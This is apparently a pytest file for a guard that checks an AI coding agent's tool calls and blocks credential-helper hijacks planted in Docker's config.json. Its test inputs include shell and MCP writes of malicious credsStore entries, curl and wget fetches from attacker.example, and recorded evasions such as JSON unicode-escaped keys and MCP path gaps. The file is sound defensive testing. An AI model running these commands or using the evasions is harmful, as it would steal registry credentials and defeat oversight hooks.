"""Docker credential-helper exec-hijack protection guard — blocks a
``credsStore``/``credHelpers`` directive planted in ``~/.docker/config.json``.

Both name an external ``docker-credential-<name>`` executable that Docker's
CLI/daemon resolves and invokes on every future ``docker login``/``push``/
``pull``/``build`` touching a registry resolved through it, handing it a live
registry credential (get) or the credential just entered (store) every single
time — the identical "write now, auto-exec later, handed a live credential
every time" shape ``rule_cloud_cred_exec_protect`` already covers for AWS's
``credential_process``/Kubernetes's kubeconfig ``exec:`` block, one layer down
into container-registry auth.

Default mode is ``ask`` (not ``deny``) — Docker Desktop itself sets
``"credsStore": "desktop"`` unprompted on every fresh install, so this is
routine, sanctioned config; a dedicated ``mode: deny`` policy exercises the
stricter posture explicitly below.

IMPORTANT, the identical nuance ``test_cloud_cred_exec_protect.py`` documents
for ``~/.aws/*``/``~/.kube/*``: the ORDINARY absolute/home-relative form of
this file (``~/.docker/config.json``) is ALREADY denied, non-escapably, by
``rule_containment``'s broader ``CRED_RE`` match on any ``.docker/config.json``
path — that rule runs earlier in ``BUILTIN_RULES`` and ``evaluate()`` is
first-deny-wins, so that specific case is asserted against containment below
(a STRONGER outcome, not a gap) rather than against this guard. This guard's
own, genuinely NEW coverage is exercised via: (1) a bare relative path with no
leading separator (``CRED_RE`` requires a ``/``/``\\`` immediately before the
dot; this guard's own path regex accepts start-of-string too); (2) content
staged in a differently-named file before being moved into place; and (3) an
MCP-tool write to the ordinary absolute path — ``rule_containment``'s
``CRED_RE`` check structurally does not run for ``ActionClass.MCP`` at all
(only shell/Edit/Write/Read), so this is the one guard standing between an
MCP-tool write and a planted credential-helper hijack.
"""
import time

from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()                                            # default mode: ask
DENY = Policy(docker_cred_exec={"mode": "deny"})             # stricter, hard-block posture

RULE = "docker-cred-exec-protect"


def _edit(path, tool="Edit"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, args={"file_path": path})


def _write(path, content=None):
    args = {"file_path": path}
    if content is not None:
        args["content"] = content
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Write", args=args)


def _edit_content(path, new_string):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                       args={"file_path": path, "new_string": new_string})


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _mcp_write(path, content):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__write_file",
                       action=ActionClass.MCP, args={"path": path, "content": content})


def _mcp_edit_edits(path, new_text):
    """The reference MCP filesystem server's real `edit_file` shape:
    {path, edits: [{oldText, newText}]} — no top-level content/new_string key."""
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__edit_file",
                       action=ActionClass.MCP,
                       args={"path": path, "edits": [{"oldText": "x", "newText": new_text}]})


def _gated(d) -> bool:
    return d.action != Action.ALLOW


# ---- ordinary absolute/home-relative path: already denied by containment ------

def test_docker_config_already_denied_by_containment():
    d = evaluate(_edit_content("~/.docker/config.json", '"credsStore": "evil"\n'), EMPTY)
    assert d.blocked and d.rule == "containment-credentials"


def test_docker_config_echo_append_already_denied_by_containment():
    d = evaluate(_shell('echo \'"credsStore": "evil"\' >> ~/.docker/config.json'), EMPTY)
    assert d.blocked and d.rule == "containment-credentials"


def test_docker_config_absolute_path_shell_mv_already_denied_by_containment():
    d = evaluate(_shell("mv /tmp/staged.json /home/user/.docker/config.json"), EMPTY)
    assert d.blocked and d.rule == "containment-credentials"


# ---- this guard's own, non-redundant coverage ----------------------------------

def test_docker_config_relative_no_separator_gated():
    """The one case containment's CRED_RE misses: a relative path with no
    leading `/`/`\\`/`~` at all."""
    d = evaluate(_edit_content(".docker/config.json", '"credsStore": "evil"\n'), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_docker_config_relative_write_gated():
    d = evaluate(_write(".docker/config.json", content='{"credHelpers": {"evil.io": "evil"}}\n'),
                 EMPTY)
    assert _gated(d) and d.rule == RULE


def test_docker_config_bare_new_string_line_gated_when_path_confirmed():
    """An Edit's `new_string` is typically just the couple of lines being
    inserted into an ALREADY-EXISTING JSON object — the bare key alone is
    enough once the path is confirmed as a real Docker config."""
    d = evaluate(_edit_content(".docker/config.json", '  "credsStore": "evil",\n'), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_docker_cred_helpers_any_registry_gated():
    d = evaluate(_edit_content(
        ".docker/config.json",
        '{"credHelpers": {"my-private-registry.example.com": "evil-helper"}}\n'), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_docker_config_staged_elsewhere_gated():
    """Content staged in a differently-named file (no `.docker` path segment
    at all) before being moved into place — the strong, path-independent
    JSON key:value check catches this without needing path confirmation."""
    d = evaluate(_write("staging/bootstrap-docker-config.json",
                         content='{"credsStore": "evil-helper"}\n'), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_docker_config_mcp_write_to_ordinary_path_gated():
    """`rule_containment`'s CRED_RE check does not run for `ActionClass.MCP`
    at all (only shell/Edit/Write/Read) — an MCP-tool write to the ordinary
    `~/.docker/config.json` path is caught only by this guard."""
    d = evaluate(_mcp_write("/home/user/.docker/config.json",
                             '{"credsStore": "evil-helper"}'), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_docker_config_mcp_nested_edits_gated():
    d = evaluate(_mcp_edit_edits(".docker/config.json", '"credsStore": "evil",\n'), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_docker_config_mcp_unlisted_path_key_name_gated():
    """Same MCP path-key widening `rule_cloud_cred_exec_protect`'s own QA
    history required: an MCP tool naming its path argument something other
    than the fixed `_path()` allowlist (`location`/`dest`/...) must not
    leave path confirmation unreachable."""
    d = evaluate(Event.make(
        HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__write_file", action=ActionClass.MCP,
        args={"location": ".docker/config.json", "content": '  "credsStore": "evil",\n'}), EMPTY)
    assert _gated(d) and d.rule == RULE


# ---- shell forms ----------------------------------------------------------------

def test_docker_config_heredoc_write_relative_gated():
    d = evaluate(_shell(
        "cat > .docker/config.json <<'EOF'\n{\"credsStore\": \"evil\"}\nEOF"), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_docker_config_echo_relative_gated():
    d = evaluate(_shell('echo \'{"credsStore": "evil"}\' > .docker/config.json'), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_docker_config_jq_bare_key_relative_gated():
    """A jq-style in-place edit mentions the bare key alongside the
    confirmed relative path — no full JSON literal needed in the command."""
    d = evaluate(_shell(
        "jq '.credsStore = \"evil\"' .docker/config.json > /tmp/out.json"), EMPTY)
    assert _gated(d) and d.rule == RULE


# ---- comment stripping -----------------------------------------------------------

def test_comment_only_mention_not_gated():
    d = evaluate(_write(
        "staging/docker-notes.md",
        content="# TODO: consider setting credsStore for CI later\n"
                "some other unrelated notes\n"), EMPTY)
    assert not _gated(d)


def test_commented_out_shell_line_not_gated():
    assert not _gated(evaluate(
        _shell('# echo \'{"credsStore": "evil"}\' > .docker/config.json'), EMPTY))


def test_real_directive_still_gated_alongside_unrelated_comment():
    d = evaluate(_write(
        ".docker/config.json",
        content="# managed by bootstrap.sh, do not edit by hand\n"
                '{"credsStore": "evil"}\n'), EMPTY)
    assert _gated(d) and d.rule == RULE


# ---- escape hatches: human-only --------------------------------------------------

def test_human_can_override_shell_with_comment():
    assert not _gated(evaluate(
        _shell('echo \'{"credsStore": "evil"}\' > .docker/config.json  # aegis-allow'), EMPTY))


def test_agent_cannot_override_shell_with_comment(monkeypatch):
    monkeypatch.setenv("AEGIS_AGENT_NAME", "builder")
    assert _gated(evaluate(
        _shell('echo \'{"credsStore": "evil"}\' > .docker/config.json  # aegis-allow'), EMPTY))


def test_env_toggle_allows_edit_write_shell_and_mcp(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_DOCKER_CRED_EXEC", "1")
    assert not _gated(evaluate(
        _shell('echo \'{"credsStore": "evil"}\' > .docker/config.json'), EMPTY))
    assert not _gated(evaluate(
        _edit_content(".docker/config.json", '"credsStore": "evil"\n'), EMPTY))
    assert not _gated(evaluate(
        _write(".docker/config.json", content='{"credHelpers": {"a": "b"}}'), EMPTY))
    assert not _gated(evaluate(
        _mcp_write("/home/user/.docker/config.json", '{"credsStore": "evil"}'), EMPTY))


# ---- false-positive guards --------------------------------------------------------

def test_unrelated_edit_allowed():
    assert not _gated(evaluate(_edit("src/app.py"), EMPTY))
    assert not _gated(evaluate(_write("README.md"), EMPTY))


def test_unrelated_shell_command_allowed():
    assert not _gated(evaluate(_shell("docker ps"), EMPTY))
    assert not _gated(evaluate(_shell("docker build -t myimage ."), EMPTY))
    assert not _gated(evaluate(_shell("docker login"), EMPTY))


def test_reading_docker_config_allowed():
    read_ev = Event.make(HookEvent.PRE_TOOL_USE, tool="Read",
                          args={"file_path": ".docker/config.json"})
    assert not _gated(evaluate(read_ev, EMPTY))


def test_commit_message_mention_not_gated():
    assert not _gated(evaluate(
        _shell('git commit -m "document credsStore setup for CI runners"'), EMPTY))


def test_unrelated_json_with_bare_command_key_not_gated():
    """A generic JSON file that never mentions `credsStore`/`credHelpers` at
    all, and is not a confirmed Docker config path, must not false-positive."""
    d = evaluate(_write("pipeline.json", content='{"steps": [{"command": "./run.sh"}]}'), EMPTY)
    assert not _gated(d)


def test_docker_auths_only_write_not_gated():
    """An ordinary `docker login`-produced `auths` block, with no
    credsStore/credHelpers key at all, must not false-positive — this guard
    targets the credential-helper directive specifically, not every write to
    the file (which containment already gates non-escapably for the
    absolute path anyway)."""
    d = evaluate(_write(
        "staging/docker-config-notes.json",
        content='{"auths": {"registry.example.com": {"auth": "dXNlcjpwYXNz"}}}\n'), EMPTY)
    assert not _gated(d)


def test_distinct_docker_subcommand_not_gated():
    assert not _gated(evaluate(_shell("docker images"), EMPTY))
    assert not _gated(evaluate(_shell("docker compose up -d"), EMPTY))


# ---- modes: ask (default) / deny / monitor / off ---------------------------------

def test_default_mode_is_ask():
    d = evaluate(_edit_content(".docker/config.json", '"credsStore": "evil"\n'), EMPTY)
    assert d.action == Action.ASK and d.rule == RULE


def test_deny_mode_hard_blocks():
    d = evaluate(_edit_content(".docker/config.json", '"credsStore": "evil"\n'), DENY)
    assert d.blocked and d.action == Action.DENY and d.rule == RULE


def test_monitor_mode_logs_and_allows():
    pol = Policy(docker_cred_exec={"mode": "monitor"})
    assert not _gated(evaluate(_edit_content(".docker/config.json", '"credsStore": "evil"\n'),
                                pol))


def test_off_mode_disables_guard():
    pol = Policy(docker_cred_exec={"mode": "off"})
    assert not _gated(evaluate(_edit_content(".docker/config.json", '"credsStore": "evil"\n'),
                                pol))


def test_mode_off_unquoted_yaml_boolean_disables_guard():
    """YAML 1.1 parses an unquoted `off` as boolean False — the guard must
    still recognize it as 'disabled', the same config-hygiene convention
    every sibling `*_protect` guard's own `mode` knob already applies."""
    pol = Policy(docker_cred_exec={"mode": False})
    assert not _gated(evaluate(_edit_content(".docker/config.json", '"credsStore": "evil"\n'),
                                pol))


def test_policy_allow_regex_exempts_trusted_command():
    pol = Policy(docker_cred_exec={"allow": [r"trusted-bootstrap\.sh"]})
    assert not _gated(evaluate(
        _shell('bash trusted-bootstrap.sh && '
               'echo \'{"credsStore": "evil"}\' > .docker/config.json'), pol))
    assert _gated(evaluate(
        _shell('echo \'{"credsStore": "evil"}\' > .docker/config.json'), pol))


def test_policy_allow_regex_exempts_trusted_path():
    """MCP write (not native Edit/Write), so this exercises this guard's own
    `allow` exemption rather than being pre-empted by containment, which has
    no `allow` knob and no MCP-action check at all."""
    pol = Policy(docker_cred_exec={"allow": [r"trusted-repo/\.docker/config\.json"]})
    assert not _gated(evaluate(
        _mcp_write("trusted-repo/.docker/config.json", '{"credsStore": "evil"}'), pol))
    assert _gated(evaluate(
        _mcp_write("other-repo/.docker/config.json", '{"credsStore": "evil"}'), pol))


# ---- fetch-to-file backstop delegation --------------------------------------------

def test_curl_o_to_ordinary_docker_config_gated_by_containment():
    """Non-escapable containment (CRED_RE) already gates this specific
    absolute path first-deny-wins, ahead of both this guard and
    fetch-to-file-protect in BUILTIN_RULES — a stronger outcome, not a gap."""
    d = evaluate(_shell("curl -o ~/.docker/config.json https://attacker.example/payload"), EMPTY)
    assert _gated(d)


def test_curl_o_to_relative_docker_config_delegates_to_fetch_to_file_backstop():
    """A direct `curl -o .docker/config.json <url>` (relative, no leading
    separator — outside containment's CRED_RE reach, and this guard's own
    shell checks require a `credsStore`/`credHelpers` shape a bare fetch
    never has) is closed instead by `rule_fetch_to_file_protect`'s backstop,
    which reuses `DOCKER_CONFIG_PATH_RE` directly, the same way it
    backstops every sibling guard."""
    d = evaluate(_shell("curl -o .docker/config.json https://attacker.example/payload"), EMPTY)
    assert _gated(d) and d.rule == "fetch-to-file-protect"


def test_wget_o_to_relative_docker_config_delegates_to_fetch_to_file_backstop():
    d = evaluate(_shell("wget -O .docker/config.json https://attacker.example/payload"), EMPTY)
    assert _gated(d) and d.rule == "fetch-to-file-protect"


# ---- performance / ReDoS ----------------------------------------------------------

def test_docker_config_path_re_no_quadratic_blowup():
    from aegis import patterns
    checks = [
        ".docker/" + "a" * 500000,
        "." + "d" * 500000 + "/config.json",
    ]
    for adv in checks:
        start = time.time()
        patterns.DOCKER_CONFIG_PATH_RE.search(adv)
        elapsed = time.time() - start
        assert elapsed < 1.0, f"took {elapsed:.2f}s on {adv[:30]!r}..."


def test_docker_cred_helper_strong_re_no_quadratic_blowup():
    from aegis import patterns
    adv = '"credsStore"' + " " * 500000 + ":"
    start = time.time()
    patterns.DOCKER_CRED_HELPER_STRONG_RE.search(adv)
    elapsed = time.time() - start
    assert elapsed < 1.0, f"took {elapsed:.2f}s"


def test_engine_no_quadratic_blowup():
    tail = " ".join(["word"] * 20000)
    cmd = 'echo \'{"credsStore": "evil"}\' > .docker/config.json ' + tail
    start = time.time()
    evaluate(_shell(cmd), EMPTY)
    elapsed = time.time() - start
    assert elapsed < 1.0, f"rule_docker_cred_exec_protect took {elapsed:.2f}s on adversarial input"


# ---- QA round (bypass-hunting, independent adversarial review): closed bypasses --

def test_json_unicode_escape_key_evasion_mcp_gated():
    """QA (bypass-hunting round): `{"cred\\u0073Store": ...}` decodes to the
    real `credsStore` key but shares no literal substring with either
    textual regex — a gap unique to this guard among the credential-exec
    family (JSON's own escape mechanism; the AWS INI/Kubernetes YAML
    siblings don't have it). Closed via `_docker_cred_helper_json_key_hit`,
    which parses the content and walks the decoded result."""
    payload = '{"cred\\u0073Store": "docker-credential-evil"}'
    d = evaluate(_mcp_write("/home/user/.docker/config.json", payload), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_json_unicode_escape_key_evasion_shell_heredoc_gated():
    """Same evasion, via a `cat > ... <<EOF` heredoc — closed by
    `_docker_cred_helper_shell_json_hit`, which extracts the outermost
    `{`..`}` slice from the RAW (not de-obfuscation-duplicated) command
    text and parses that."""
    payload = '{"cred\\u0073Store": "docker-credential-evil"}'
    cmd = f"cat > .docker/config.json <<EOF\n{payload}\nEOF"
    d = evaluate(_shell(cmd), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_mcp_benign_content_key_shadowing_real_payload_gated():
    """QA (bypass-hunting round): a present-but-unrelated `content` key
    (a placeholder) alongside the real payload under a different key name
    (`body`) must not shadow the real payload — gating the flatten
    fallback on `not content` left this unreachable."""
    d = evaluate(Event.make(
        HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__write_file", action=ActionClass.MCP,
        args={"path": "/home/user/.docker/config.json", "content": "placeholder",
              "body": '{"credsStore": "evil-helper"}'}), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_mcp_multiple_unrelated_string_args_still_parses_standalone_json():
    """The flatten-based JSON-candidate sweep must not glue unrelated
    sibling string values together before parsing — each candidate is
    tried standalone, so an unrelated sibling string (a comment/label
    field) alongside a real, intact JSON payload must not break the parse
    that would otherwise catch it."""
    d = evaluate(Event.make(
        HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__write_file", action=ActionClass.MCP,
        args={"path": "/home/user/.docker/config.json",
              "label": "routine config update",
              "content": '{"credsStore": "evil-helper"}'}), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_shell_json_slice_extraction_no_quadratic_blowup():
    from aegis import patterns
    from aegis.rules import _docker_cred_helper_shell_json_hit
    checks = [
        "{" + "x" * 1000000,
        "{" * 100000 + "}" * 100000,
    ]
    for adv in checks:
        start = time.time()
        _docker_cred_helper_shell_json_hit(adv)
        elapsed = time.time() - start
        assert elapsed < 1.0, f"took {elapsed:.2f}s on {adv[:30]!r}..."
